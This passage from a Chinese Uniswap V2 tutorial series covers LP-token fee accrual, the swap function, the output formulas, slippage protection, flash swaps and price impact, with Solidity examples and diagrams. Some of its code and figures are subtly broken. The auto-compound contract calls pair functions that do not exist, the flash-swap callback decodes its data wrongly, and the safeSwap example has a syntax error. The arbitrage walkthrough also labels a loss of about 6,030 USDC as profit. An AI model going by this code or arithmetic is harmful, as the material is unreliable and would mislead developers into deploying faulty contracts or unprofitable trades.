private {\n    // 手续费在swap时自动累积到储备中\n    // LP代币的价值自动增长\n \n    // 用户赎回时获得的代币会增加\n    // 这包含了本金 + 累积的手续费\n \n    emit Sync(reserve0, reserve1);\n}\n手续费增长示例：\ngantt\n    title LP价值增长（手续费累积）\n    dateFormat  HH:mm\n    axisFormat  %H:%M\n\n    section 池子状态\n    初始储备       :a1, 2023-01-01 00:00, 24h\n    第一笔交易     :a1, 2023-01-01 06:00, 12h\n    手续费累积     :crit, 2023-01-01 12:00, 48h\n    LP价值增长     :a2, 2023-01-03 00:00, 24h\n\n\n7. 实战示例\n7.1 完整流动性管理合约\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n \nimport &quot;@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol&quot;;\nimport &quot;@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol&quot;;\n \ncontract LiquidityManager {\n    IUniswapV2Router02 public immutable router;\n \n    struct LiquidityPosition {\n        address pair;\n        uint256 liquidity;\n        uint256 amount0;\n        uint256 amount1;\n    }\n \n    mapping(address =&gt; LiquidityPosition[]) public positions;\n \n    constructor(address _router) {\n        router = IUniswapV2Router02(_router);\n    }\n \n    // 添加流动性\n    function addLiquidity(\n        address token0,\n        address token1,\n        uint256 amount0Desired,\n        uint256 amount1Desired,\n        uint256 amount0Min,\n        uint256 amount1Min,\n        address to\n    ) external returns (\n        uint256 amount0,\n        uint256 amount1,\n        uint256 liquidity\n    ) {\n        // 1. 授权router\n        IERC20(token0).approve(address(router), type(uint256).max);\n        IERC20(token1).approve(address(router), type(uint256).max);\n \n        // 2. 转账代币\n        IERC20(token0).transferFrom(msg.sender, address(this), amount0Desired);\n        IERC20(token1).transferFrom(msg.sender, address(this), amount1Desired);\n \n        // 3. 添加流动性\n        (amount0, amount1, liquidity) = router.addLiquidity(\n            token0,\n            token1,\n            amount0Desired,\n            amount1Desired,\n            amount0Min,\n            amount1Min,\n            to,\n            block.timestamp\n        );\n \n        // 4. 记录头寸\n        address pair = IUniswapV2Factory(router.factory()).getPair(token0, token1);\n        positions[msg.sender].push(LiquidityPosition({\n            pair: pair,\n            liquidity: liquidity,\n            amount0: amount0,\n            amount1: amount1\n        }));\n \n        emit LiquidityAdded(msg.sender, pair, liquidity);\n    }\n \n    // 移除流动性\n    function removeLiquidity(\n        address token0,\n        address token1,\n        uint256 liquidity,\n        uint256 amount0Min,\n        uint256 amount1Min,\n        address to\n    ) external returns (\n        uint256 amount0,\n        uint256 amount1\n    ) {\n        // 1. 授权router\n        address pair = IUniswapV2Factory(router.factory()).getPair(token0, token1);\n        IUniswapV2Pair(pair).approve(address(router), liquidity);\n \n        // 2. 移除流动性\n        (amount0, amount1) = router.removeLiquidity(\n            token0,\n            token1,\n            liquidity,\n            amount0Min,\n            amount1Min,\n            to,\n            block.timestamp\n        );\n \n        emit LiquidityRemoved(msg.sender, pair, liquidity);\n    }\n \n    event LiquidityAdded(address indexed user, address indexed pair, uint256 liquidity);\n    event LiquidityRemoved(address indexed user, address indexed pair, uint256 liquidity);\n}\n7.2 自动复投合约\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n \nimport &quot;@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol&quot;;\n \ncontract AutoCompound {\n    IUniswapV2Pair public pair;\n    address public owner;\n \n    uint256 public lastCompoundTime;\n    uint256 public compoundInterval = 1 days;\n \n    constructor(address _pair) {\n        pair = IUniswapV2Pair(_pair);\n        owner = msg.sender;\n        lastCompoundTime = block.timestamp;\n    }\n \n    function compound() external {\n        require(msg.sender == owner, &quot;Not owner&quot;);\n        require(\n            block.timestamp &gt;= lastCompoundTime + compoundInterval,\n            &quot;Too early&quot;\n        );\n \n        // 1. 获取当前LP代币余额\n        uint256 liquidity = pair.balanceOf(address(this));\n \n        // 2. 移除流动性\n        pair.approve(address(pair), liquidity);\n        (uint256 amount0, uint256 amount1) = pair.removeLiquidity(\n            liquidity,\n            0,\n            0,\n            address(this),\n            block.timestamp\n        );\n \n        // 3. 重新添加流动性\n        IERC20(pair.token0()).approve(address(pair), amount0);\n        IERC20(pair.token1()).approve(address(pair), amount1);\n        pair.mint{value: 0}(address(this));\n \n        lastCompoundTime = block.timestamp;\n \n        emit Compounded(liquidity, amount0, amount1);\n    }\n \n    event Compounded(\n        uint256 liquidity,\n        uint256 amount0,\n        uint256 amount1\n    );\n}\n\n8. 本章小结\n8.1 流动性管理总结\nmindmap\n  root((流动性管理))\n    添加流动性\n      mint函数\n      按比例提供\n      获得LP代币\n    移除流动性\n      burn函数\n      按比例赎回\n      销毁LP代币\n    LP代币\n      ERC20标准\n      代表池子份额\n      可转让交易\n    手续费\n      0.3%自动累积\n      按份额分配\n      自动复投\n\n8.2 关键函数回顾\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n函数功能公式mint()添加流动性liquidity = √(amount0 × amount1) (首次)burn()移除流动性amount = liquidity × reserve / totalSupplygetReserves()获取储备量返回reserve0, reserve1, timestamp_update()更新状态更新储备、预言机\n\n下一篇预告\n在下一篇文章中，我们将深入探讨交换机制深度解析，包括：\n\nswap函数完整实现\n滑点计算与保护\nFlash Swap机制详解\n交换最佳实践\n\n\n参考资料\n\nUniswap V2 Core - UniswapV2Pair.sol\nUniswap V2 Core - UniswapV2ERC20.sol\nERC-20 Token Standard\n"},"blockchainguide/DApp_Development/应用场景/defi/uniswap/v2/04-交换机制深度解析":{"slug":"blockchainguide/DApp_Development/应用场景/defi/uniswap/v2/04-交换机制深度解析","filePath":"blockchainguide/DApp_Development/应用场景/defi/uniswap/v2/04-交换机制深度解析.md","title":"04-交换机制深度解析","links":[],"tags":[],"content":"死磕Uniswap V2（四）：交换机制深度解析\n\n本文是「死磕Uniswap V2」系列的第四篇，深入剖析V2的交换机制，包括swap函数、滑点保护和Flash Swap。\n\n系列导航\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n序号标题核心内容01V2概述与核心原理恒定乘积AMM、核心公式02Factory与Pair合约合约结构、创建流程03流动性与LP代币mint/burn、份额计算04交换机制深度解析swap函数、滑点、Flash Swap05价格预言机TWAP、价格计算06Router与路由最佳路径、多跳交易07安全实践与最佳实践漏洞防护、开发建议\n\n1. 交换机制概览\n1.1 swap基本流程\nsequenceDiagram\n    participant U as User\n    participant R as Router\n    participant P as Pair\n    participant T0 as Token0\n    participant T1 as Token1\n\n    U-&gt;&gt;R: swapExactTokensForTokens()\n    R-&gt;&gt;T0: transferFrom(user, router)\n    R-&gt;&gt;P: swap(amount0Out, amount1Out, to, data)\n    P-&gt;&gt;T0: transferFrom(router, pair)\n    P-&gt;&gt;P: 验证储备量\n    P-&gt;&gt;T1: transfer(to, amount1Out)\n    P-&gt;&gt;P: _update(balance0, balance1)\n    P-&gt;&gt;P: emit Swap()\n\n1.2 交换类型\ngraph TB\n    subgraph SwapTypes[\\&quot;交换类型\\&quot;]\n        Direct[\\&quot;直接交换&lt;br/&gt;TokenA ↔ TokenB\\&quot;]\n        MultiHop[\\&quot;多跳交换&lt;br/&gt;TokenA → ETH → TokenB\\&quot;]\n        Flash[\\&quot;Flash Swap&lt;br/&gt;无抵押借贷\\&quot;]\n    end\n\n    Direct --&gt; D1[\\&quot;单笔交易\\&quot;]\n    MultiHop --&gt; M1[\\&quot;多笔交易\\&quot;]\n    Flash --&gt; F1[\\&quot;原子化完成\\&quot;]\n\n    style Direct fill:#e3f2fd\n    style MultiHop fill:#fff3e0\n    style Flash fill:#f3e5f5\n\n\n2. swap函数详解\n2.1 函数签名\nfunction swap(\n    uint256 amount0Out,\n    uint256 amount1Out,\n    address to,\n    bytes calldata data\n) external lock;\n参数说明：\n\namount0Out: 输出的Token0数量（两者之一必须为0）\namount1Out: 输出的Token1数量（两者之一必须为0）\nto: 接收代币的地址\ndata: Flash Swap回调数据\n\n2.2 完整代码\nfunction swap(\n    uint256 amount0Out,\n    uint256 amount1Out,\n    address to,\n    bytes calldata data\n) external lock {\n    // 1. 验证输出参数\n    require(\n        amount0Out &gt; 0 || amount1Out &gt; 0,\n        &quot;UniswapV2: INSUFFICIENT_OUTPUT_AMOUNT&quot;\n    );\n    require(\n        amount0Out == 0 || amount1Out == 0,\n        &quot;UniswapV2: INVALID_OUTPUT_AMOUNT&quot;\n    );\n \n    // 2. 获取当前储备量\n    (uint112 reserve0, uint112 reserve1, ) = getReserves();\n    require(\n        reserve0 &gt; amount0Out &amp;&amp; reserve1 &gt; amount1Out,\n        &quot;UniswapV2: INSUFFICIENT_LIQUIDITY&quot;\n    );\n \n    // 3. 优化：避免堆栈过深\n    {\n        // 4. 先转出代币（检查-生效模式）\n        address token0 = token0;\n        address token1 = token1;\n        require(\n            to != token0 &amp;&amp; to != token1,\n            &quot;UniswapV2: INVALID_TO&quot;\n        );\n \n        if (amount0Out &gt; 0) {\n            IERC20(token0).transfer(to, amount0Out);\n        }\n        if (amount1Out &gt; 0) {\n            IERC20(token1).transfer(to, amount1Out);\n        }\n \n        // 5. 处理Flash Swap回调\n        if (data.length &gt; 0) {\n            IUniswapV2Callee(to).uniswapV2Call(\n                msg.sender,\n                amount0Out,\n                amount1Out,\n                data\n            );\n        }\n    }\n \n    // 6. 计算实际存入数量\n    uint256 balance0 = IERC20(token0).balanceOf(address(this));\n    uint256 balance1 = IERC20(token1).balanceOf(address(this));\n \n    uint256 amount0In = balance0 &gt; reserve0 - amount0Out\n        ? balance0 - (reserve0 - amount0Out)\n        : 0;\n    uint256 amount1In = balance1 &gt; reserve1 - amount1Out\n        ? balance1 - (reserve1 - amount1Out)\n        : 0;\n \n    require(\n        amount0In &gt; 0 || amount1In &gt; 0,\n        &quot;UniswapV2: INSUFFICIENT_INPUT_AMOUNT&quot;\n    );\n \n    // 7. 验证恒定乘积公式（含手续费）\n    {\n        uint256 balance0Adjusted = balance0 * 1000 - amount0In * 3;\n        uint256 balance1Adjusted = balance1 * 1000 - amount1In * 3;\n        require(\n            balance0Adjusted * balance1Adjusted &gt;= uint256(reserve0) * reserve1 * 1000000,\n            &quot;UniswapV2: K&quot;\n        );\n    }\n \n    // 8. 更新储备量\n    _update(balance0, balance1);\n \n    emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);\n}\n2.3 交换流程图\nflowchart TD\n    A[\\&quot;调用swap()\\&quot;] --&gt; B{检查参数}\n    B --&gt;|amount0Out=amount1Out=0| C[\\&quot;revert&lt;br/&gt;INSUFFICIENT_OUTPUT_AMOUNT\\&quot;]\n    B --&gt;|两者都&gt;0| D[\\&quot;revert&lt;br/&gt;INVALID_OUTPUT_AMOUNT\\&quot;]\n    B --&gt;|参数有效| E[\\&quot;获取储备量\\&quot;]\n    E --&gt; F{检查流动性}\n    F --&gt;|储备不足| G[\\&quot;revert&lt;br/&gt;INSUFFICIENT_LIQUIDITY\\&quot;]\n    F --&gt;|储备充足| H[\\&quot;转出代币给to\\&quot;]\n    H --&gt; I{data.length&gt;0?}\n    I --&gt;|是| J[\\&quot;调用回调&lt;br/&gt;uniswapV2Call()\\&quot;]\n    I --&gt;|否| K[\\&quot;跳过回调\\&quot;]\n    J --&gt; K\n    K --&gt; L[\\&quot;获取新余额\\&quot;]\n    L --&gt; M[\\&quot;计算实际输入\\&quot;]\n    M --&gt; N[\\&quot;验证K值\\&quot;]\n    N --&gt;|K值验证失败| O[\\&quot;revert&lt;br/&gt;K\\&quot;]\n    N --&gt;|K值验证通过| P[\\&quot;更新储备量\\&quot;]\n    P --&gt; Q[\\&quot;emit Swap事件\\&quot;]\n\n\n3. 交换计算公式\n3.1 输入输出推导\n恒定乘积公式：\nx × y = k\n\n推导过程：\n初始状态: x₀ × y₀ = k\n交易后:   (x₀ + Δx) × (y₀ - Δy) = k\n\n展开:  x₀y₀ + x₀Δy - y₀Δx - ΔxΔy = k\n由于 x₀y₀ = k:\n      x₀Δy - y₀Δx - ΔxΔy = 0\n\n整理得输出公式:\nΔy = y₀ × Δx / (x₀ + Δx)\n\n考虑0.3%手续费：\nΔy = y₀ × (Δx × 0.997) / (x₀ + Δx × 0.997)\n\n3.2 getAmountOut函数\nfunction getAmountOut(\n    uint256 amountIn,\n    uint256 reserveIn,\n    uint256 reserveOut\n) external pure returns (uint256 amountOut) {\n    require(amountIn &gt; 0, &quot;UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT&quot;);\n    require(\n        reserveIn &gt; 0 &amp;&amp; reserveOut &gt; 0,\n        &quot;UniswapV2Library: INSUFFICIENT_LIQUIDITY&quot;\n    );\n \n    uint256 amountInWithFee = amountIn * 997;\n    uint256 numerator = amountInWithFee * reserveOut;\n    uint256 denominator = reserveIn * 1000 + amountInWithFee;\n \n    amountOut = numerator / denominator;\n}\n3.3 getAmountIn函数\nfunction getAmountIn(\n    uint256 amountOut,\n    uint256 reserveIn,\n    uint256 reserveOut\n) external pure returns (uint256 amountIn) {\n    require(amountOut &gt; 0, &quot;UniswapV2Library: INSUFFICIENT_OUTPUT_AMOUNT&quot;);\n    require(\n        reserveIn &gt; 0 &amp;&amp; reserveOut &gt; 0,\n        &quot;UniswapV2Library: INSUFFICIENT_LIQUIDITY&quot;\n    );\n \n    uint256 numerator = reserveIn * amountOut * 1000;\n    uint256 denominator = (reserveOut - amountOut) * 997;\n \n    amountIn = (numerator / denominator) + 1;\n}\n3.4 计算示例\nflowchart LR\n    subgraph Before[\\&quot;交易前状态\\&quot;]\n        X0[\\&quot;x₀ = 1000 ETH\\&quot;]\n        Y0[\\&quot;y₀ = 2,000,000 USDC\\&quot;]\n        K0[\\&quot;k = 2×10⁹\\&quot;]\n    end\n\n    subgraph Trade[\\&quot;交易: 用10 ETH换USDC\\&quot;]\n        Input[\\&quot;Δx = 10 ETH\\&quot;]\n        Calc[\\&quot;Δy = 2,000,000 × 9.97 / (1000 + 9.97)\\&quot;]\n        Output[\\&quot;Δy ≈ 19,743 USDC\\&quot;]\n    end\n\n    subgraph After[\\&quot;交易后状态\\&quot;]\n        X1[\\&quot;x₁ = 1010 ETH\\&quot;]\n        Y1[\\&quot;y₁ = 1,980,257 USDC\\&quot;]\n        K1[\\&quot;k ≈ 2×10⁹\\&quot;]\n    end\n\n    Before --&gt; Trade --&gt; After\n\n    style Output fill:#c8e6c9\n\n\n4. 滑点保护\n4.1 滑点概念\ngraph TB\n    subgraph Expected[\\&quot;预期交易\\&quot;]\n        E1[\\&quot;输入: 10 ETH\\&quot;]\n        E2[\\&quot;预期输出: 20,000 USDC\\&quot;]\n        E3[\\&quot;预期价格: 1 ETH = 2,000 USDC\\&quot;]\n    end\n\n    subgraph Actual[\\&quot;实际交易\\&quot;]\n        A1[\\&quot;输入: 10 ETH\\&quot;]\n        A2[\\&quot;实际输出: 19,743 USDC\\&quot;]\n        A3[\\&quot;实际价格: 1 ETH = 1,974 USDC\\&quot;]\n    end\n\n    subgraph Slippage[\\&quot;滑点\\&quot;]\n        S1[\\&quot;滑点 = (20000 - 19743) / 20000\\&quot;]\n        S2[\\&quot;滑点 = 1.29%\\&quot;]\n    end\n\n    Expected --&gt; Actual\n    Actual --&gt; Slippage\n\n    style S2 fill:#ffcdd2\n\n4.2 滑点计算\nfunction calculateSlippage(\n    uint256 expectedAmount,\n    uint256 actualAmount\n) external pure returns (uint256 slippageBps) {\n    require(expectedAmount &gt; 0, &quot;Expected amount must be &gt; 0&quot;);\n    require(actualAmount &lt;= expectedAmount, &quot;Actual exceeds expected&quot;);\n \n    uint256 diff = expectedAmount - actualAmount;\n    slippageBps = (diff * 10000) / expectedAmount; // 基点\n}\n \n// 使用示例: 1% = 100 bps, 0.3% = 30 bps\n4.3 最小输出保护\nfunction swapWithSlippageProtection(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address pair,\n    address tokenIn,\n    address tokenOut,\n    address to\n) external returns (uint256 amountOut) {\n    // 1. 计算预期输出\n    (uint256 reserveIn, uint256 reserveOut, ) = IUniswapV2Pair(pair).getReserves();\n \n    uint256 amountOutExpected = getAmountOut(\n        amountIn,\n        reserveIn,\n        reserveOut\n    );\n \n    // 2. 验证最小输出\n    require(\n        amountOutExpected &gt;= amountOutMin,\n        &quot;UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT&quot;\n    );\n \n    // 3. 执行交易\n    // ... (实际交易代码)\n \n    return amountOut;\n}\n4.4 滑点容忍度设置\ngraph TB\n    subgraph SlippageTolerance[\\&quot;滑点容忍度设置\\&quot;]\n        Conservative[\\&quot;保守型&lt;br/&gt;0.1% - 0.3%\\&quot;]\n        Standard[\\&quot;标准型&lt;br/&gt;0.5% - 1%\\&quot;]\n        Aggressive[\\&quot;激进型&lt;br/&gt;1% - 3%\\&quot;]\n    end\n\n    Conservative --&gt; C1[\\&quot;适用: 大额交易&lt;br/&gt;低风险偏好\\&quot;]\n    Standard --&gt; S1[\\&quot;适用: 常规交易&lt;br/&gt;平衡风险\\&quot;]\n    Aggressive --&gt; A1[\\&quot;适用: 小额交易&lt;br/&gt;追求成交\\&quot;]\n\n    style Conservative fill:#c8e6c9\n    style Standard fill:#fff3e0\n    style Aggressive fill:#ffcdd2\n\n\n5. Flash Swap详解\n5.1 Flash Swap概念\nFlash Swap允许用户在无需提供抵押的情况下借出池子中的代币，只要在同一笔交易中归还。\nsequenceDiagram\n    participant U as User\n    participant P as Pair合约\n    participant DEX as DEX B\n    participant T as Token合约\n\n    U-&gt;&gt;P: swap(1000 Token0, 0, user, callbackData)\n    Note over P: 验证储备充足\n    P-&gt;&gt;U: 转账1000 Token0\n\n    U-&gt;&gt;DEX: 在DEX B上套利\n    DEX-&gt;&gt;U: 获得1050 Token1\n\n    U-&gt;&gt;T: 归还1003 Token1(含0.3%费用)\n    T-&gt;&gt;P: 接收1003 Token1\n    U-&gt;&gt;U: 保留47 Token1利润\n\n    P-&gt;&gt;P: 验证: 新储备 &gt;= 旧储备 * 1.003\n    Note over P: K值验证通过\n\n5.2 Flash Swap类型\ngraph TB\n    subgraph FlashTypes[\\&quot;Flash Swap类型\\&quot;]\n        TokenBorrow[\\&quot;借出代币\\&quot;]\n        Arbitrage[\\&quot;套利\\&quot;]\n        Liquidation[\\&quot;清算\\&quot;]\n        CollateralSwap[\\&quot;抵押品置换\\&quot;]\n    end\n\n    TokenBorrow --&gt; T1[\\&quot;无需抵押&lt;br/&gt;单交易内归还\\&quot;]\n    Arbitrage --&gt; A1[\\&quot;价格差异&lt;br/&gt;跨DEX套利\\&quot;]\n    Liquidation --&gt; L1[\\&quot;抵押品不足&lt;br/&gt;触发清算\\&quot;]\n    CollateralSwap --&gt; C1[\\&quot;更换抵押品&lt;br/&gt;无需先赎回\\&quot;]\n\n5.3 Flash Swap代码示例\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n \nimport &quot;@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol&quot;;\nimport &quot;@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol&quot;;\n \ncontract FlashSwapper is IUniswapV2Callee {\n    struct FlashParams {\n        address pair;          // Uniswap V2 Pair地址\n        address tokenBorrow;   // 要借的代币\n        address tokenRepay;    // 要还的代币\n        uint256 amountBorrow;  // 借的数量\n        address targetDex;     // 目标DEX\n        bytes targetData;      // 目标DEX调用数据\n    }\n \n    function executeFlashSwap(FlashParams calldata params) external {\n        // 1. 确定借出哪个token\n        uint256 amount0Out = params.tokenBorrow == IUniswapV2Pair(params.pair).token0()\n            ? params.amountBorrow\n            : 0;\n        uint256 amount1Out = params.tokenBorrow == IUniswapV2Pair(params.pair).token1()\n            ? params.amountBorrow\n            : 0;\n \n        // 2. 编码回调参数\n        bytes memory data = abi.encode(params, msg.sender);\n \n        // 3. 调用Pair的swap函数\n        IUniswapV2Pair(params.pair).swap(\n            amount0Out,\n            amount1Out,\n            address(this),\n            data\n        );\n    }\n \n    // Uniswap V2回调接口\n    function uniswapV2Call(\n        address sender,\n        uint256 amount0,\n        uint256 amount1,\n        bytes calldata data\n    ) external override {\n        // 1. 验证调用者\n        FlashParams memory params = abi.decode(data, (FlashParams, address));\n        address pair = msg.sender;\n \n        require(pair == params.pair, &quot;Invalid callback&quot;);\n \n        uint256 amountBorrowed = amount0 &gt; 0 ? amount0 : amount1;\n \n        // 2. 执行套利逻辑（示例：在另一个DEX交易）\n        // ... 这里实现具体的套利逻辑 ...\n \n        // 3. 计算需要归还的数量（本金 + 0.3%费用）\n        uint256 amountRepay = (amountBorrowed * 1000) / 997;\n \n        // 4. 授权Pair合约\n        IERC20(params.tokenRepay).approve(pair, amountRepay);\n \n        // 5. 确保合约有足够的代币归还\n        uint256 balance = IERC20(params.tokenRepay).balanceOf(address(this));\n        require(\n            balance &gt;= amountRepay,\n            &quot;Flash swap failed: insufficient repayment&quot;\n        );\n    }\n \n    // 接收代币（用于Flash Swap）\n    receive() external payable {}\n}\n5.4 Flash Swap费用计算\n// Flash Swap费用 = 借出数量的0.3%\nfunction calculateFlashSwapFee(\n    uint256 amountBorrowed\n) external pure returns (uint256 fee) {\n    // 费用 = amountBorrowed * 0.003\n    // 实际归还 = amountBorrowed * 1.003\n    fee = (amountBorrowed * 3) / 997; // 由于精度调整\n    return amountBorrowed + fee;\n}\n \n// 示例：\n// 借出 1000 Token0\n// 费用 = 1000 * 3 / 997 ≈ 3.009 Token0\n// 总归还 = 1003.009 Token0\n5.5 套利示例\nflowchart TD\n    A[\\&quot;发现价格差异&lt;br/&gt;Uniswap: 1 ETH = 2000 USDC&lt;br/&gt;SushiSwap: 1 ETH = 2010 USDC\\&quot;] --&gt; B[\\&quot;Flash Swap借1000 ETH\\&quot;]\n    B --&gt; C[\\&quot;在Uniswap借出&lt;br/&gt;无需抵押\\&quot;]\n    C --&gt; D[\\&quot;在SushiSwap卖出&lt;br/&gt;1000 ETH → 2,010,000 USDC\\&quot;]\n    D --&gt; E[\\&quot;计算需要归还&lt;br/&gt;1000 × 1.003 = 1003 ETH\\&quot;]\n    E --&gt; F[\\&quot;在SushiSwap买回&lt;br/&gt;1003 ETH → 2,016,030 USDC\\&quot;]\n    F --&gt; G{检查利润}\n    G --&gt;|2,016,030 &gt; 2,010,000| H[\\&quot;利润: 6,030 USDC - Gas费用\\&quot;]\n    G --&gt;|亏损| I[\\&quot;交易回滚\\&quot;]\n\n\n6. 价格影响分析\n6.1 价格影响公式\n价格影响 = (交易后价格 - 交易前价格) / 交易前价格 × 100%\n\n6.2 价格影响计算\nfunction calculatePriceImpact(\n    uint256 amountIn,\n    uint256 reserveIn,\n    uint256 reserveOut\n) external pure returns (uint256 priceImpactBps) {\n    // 1. 初始价格\n    uint256 initialPrice = (reserveOut * 1e18) / reserveIn;\n \n    // 2. 交易后储备\n    uint256 newReserveIn = reserveIn + amountIn;\n    uint256 amountOut = getAmountOut(amountIn, reserveIn, reserveOut);\n    uint256 newReserveOut = reserveOut - amountOut;\n \n    // 3. 交易后价格\n    uint256 finalPrice = (newReserveOut * 1e18) / newReserveIn;\n \n    // 4. 价格影响\n    uint256 priceDiff = initialPrice &gt; finalPrice\n        ? initialPrice - finalPrice\n        : finalPrice - initialPrice;\n \n    priceImpactBps = (priceDiff * 10000) / initialPrice;\n}\n6.3 价格影响与交易规模\ngraph LR\n    subgraph PriceImpact[\\&quot;价格影响 vs 交易规模\\&quot;]\n        Small[\\&quot;小额交易&lt;br/\\&quot;&lt; 池子0.1%&lt;br/&gt;价格影响 &lt; 0.1%\\&quot;]\n        Medium[\\&quot;中等交易&lt;br/&gt;池子0.1%-1%&lt;br/&gt;价格影响 0.1%-1%\\&quot;]\n        Large[\\&quot;大额交易&lt;br/&gt;\\&quot; 池子1%&lt;br/&gt;价格影响 \\&quot; 1%\\&quot;]\n    end\n\n    Small --&gt; S1[\\&quot;低滑点&lt;br/&gt;适合正常交易\\&quot;]\n    Medium --&gt; M1[\\&quot;中等滑点&lt;br/&gt;注意成本\\&quot;]\n    Large --&gt; L1[\\&quot;高滑点&lt;br/&gt;考虑分批\\&quot;]\n\n    style Small fill:#c8e6c9\n    style Medium fill:#fff3e0\n    style Large fill:#ffcdd2\n\n\n7. 交换最佳实践\n7.1 Router合约封装\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n \nimport &quot;@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol&quot;;\n \ncontract OptimizedSwapper {\n    IUniswapV2Router02 public immutable router;\n \n    constructor(address _router) {\n        router = IUniswapV2Router02(_router);\n    }\n \n    // 精确输入交换\n    function swapExactTokensForTokens(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external returns (uint256[] memory amounts) {\n        // 1. 授权Router\n        IERC20(path[0]).approve(address(router), amountIn);\n \n        // 2. 转入代币\n        IERC20(path[0]).transferFrom(msg.sender, address(this), amountIn);\n \n        // 3. 执行交换\n        amounts = router.swapExactTokensForTokens(\n            amountIn,\n            amountOutMin,\n            path,\n            to,\n            deadline\n        );\n    }\n \n    // 精确输出交换\n    function swapTokensForExactTokens(\n        uint256 amountOut,\n        uint256 amountInMax,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external returns (uint256[] memory amounts) {\n        // 授权最大数量\n        IERC20(path[0]).approve(address(router), amountInMax);\n \n        amounts = router.swapTokensForExactTokens(\n            amountOut,\n            amountInMax,\n            path,\n            to,\n            deadline\n        );\n \n        // 退还未使用的代币\n        uint256 amountUsed = amounts[0];\n        if (amountInMax &gt; amountUsed) {\n            IERC20(path[0]).transfer(msg.sender, amountInMax - amountUsed);\n        }\n    }\n \n    // 支持ETH的交换\n    function swapExactETHForTokens(\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external payable returns (uint256[] memory amounts) {\n        require(path[0] == router.WETH(), &quot;Invalid path&quot;);\n \n        amounts = router.swapExactETHForTokens{value: msg.value}(\n            amountOutMin,\n            path,\n            to,\n            deadline\n        );\n    }\n \n    // 接收ETH\n    receive() external payable {}\n}\n7.2 多跳路由\nfunction findBestPath(\n    address tokenIn,\n    address tokenOut,\n    uint256 amountIn,\n    address[] memory pairs\n) external view returns (address[] memory bestPath, uint256 bestAmount) {\n    // 简化版：直接对\n    bestPath = new address[](2);\n    bestPath[0] = tokenIn;\n    bestPath[1] = tokenOut;\n    bestAmount = getAmountOutForPair(tokenIn, tokenOut, amountIn);\n \n    // 检查通过WETH的中转路径\n    address weth = router.WETH();\n \n    if (tokenIn != weth &amp;&amp; tokenOut != weth) {\n        uint256 amountViaWeth = getAmountViaWeth(tokenIn, tokenOut, amountIn);\n \n        if (amountViaWeth &gt; bestAmount) {\n            bestPath = new address[](3);\n            bestPath[0] = tokenIn;\n            bestPath[1] = weth;\n            bestPath[2] = tokenOut;\n            bestAmount = amountViaWeth;\n        }\n    }\n}\n7.3 交换失败处理\nfunction safeSwap(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] calldata path,\n    address to,\n    uint256 deadline\n) external returns (bool success, uint256 amountOut) {\n    try router.swapExactTokensForTokens(\n        amountIn,\n        amountOutMin,\n        path,\n        to,\n        deadline\n    ) returns (uint256[] memory amounts) {\n        success = true;\n        amountOut = amounts[amounts.length - 1];\n    catch {\n        success = false;\n        amountOut = 0;\n \n        // 退还输入代币\n        IERC20(path[0]).transfer(msg.sender, amountIn);\n    }\n}\n\n8. 交换安全检查清单\n8.1 交易前检查\nmindmap\n  root((交易前检查))\n    授权检查\n      approve额度足够\n      检查无限授权风险\n    余额检查\n      输入代币充足\n      合约内无残留\n    参数验证\n      路径有效\n      非零地址\n      deadline合理\n    价格检查\n      查询链下报价\n      设置合理滑点\n      预期输出计算\n\n8.2 交易后验证\nevent SwapExecuted(\n    address indexed user,\n    address indexed tokenIn,\n    address indexed tokenOut,\n    uint256 amountIn,\n    uint256 amountOut,\n    uint256 slippage\n);\n \nfunction swapWithVerification(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] calldata path,\n    address to,\n    uint256 deadline\n) external returns (uint256 amountOut) {\n    // 1. 记录初始余额\n    uint256 initialBalance = IERC20(path[path.length - 1]).balanceOf(to);\n \n    // 2. 执行交换\n    uint256[] memory amounts = router.swapExactTokensForTokens(\n        amountIn,\n        amountOutMin,\n        path,\n        to,\n        deadline\n    );\n \n    amountOut = amounts[amounts.length - 1];\n \n    // 3. 验证最终余额\n    uint256 finalBalance = IERC20(path[path.length - 1]).balanceOf(to);\n    require(finalBalance &gt;= initialBalance + amountOut, &quot;Balance mismatch&quot;);\n \n    // 4. 计算实际滑点\n    uint256 expectedAmount = getAmountOut(\n        amountIn,\n        getReserve(path[0], path[1]).reserve0,\n        getReserve(path[0], path[1]).reserve1\n    );\n    uint256 actualSlippage = expectedAmount &gt; amountOut\n        ? ((expectedAmount - amountOut) * 10000) / expectedAmount\n        : 0;\n \n    emit SwapExecuted(msg.sender, path[0], path[path.length - 1], amountIn, amountOut, actualSlippage);\n}\n\n9. 本章小结\n9.1 交换机制总结\nmindmap\n  root((交换机制))\n    swap函数\n      输入输出参数\n      K值验证\n      储备量更新\n    滑点保护\n      预期输出计算\n      最小输出设置\n      实际滑点监控\n    Flash Swap\n      无抵押借贷\n      套利应用\n      清算应用\n    价格影响\n      交易规模\n      池子深度\n      影响计算\n\n9.2 关键函数回顾\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n函数功能关键点swap()执行交换K值验证、先输出后输入getAmountOut()计算输出含0.3%手续费getAmountIn()计算输入反向计算，需+1uniswapV2Call()Flash 